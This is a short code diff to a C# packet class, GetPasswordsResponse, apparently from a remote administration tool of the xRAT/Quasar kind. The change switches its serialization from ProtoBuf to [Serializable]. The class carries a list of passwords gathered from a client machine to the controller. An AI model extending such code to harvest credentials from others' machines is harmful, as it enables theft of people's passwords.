@@ -1,13 +1,12 @@
-﻿using System.Collections.Generic;
-using ProtoBuf;
+﻿using System;
+using System.Collections.Generic;
 using xClient.Core.Networking;
 
 namespace xClient.Core.Packets.ClientPackets
 {
-    [ProtoContract]
+    [Serializable]
     public class GetPasswordsResponse : IPacket
     {
-        [ProtoMember(1)]
         public List<string> Passwords { get; set; }
 
         public GetPasswordsResponse()
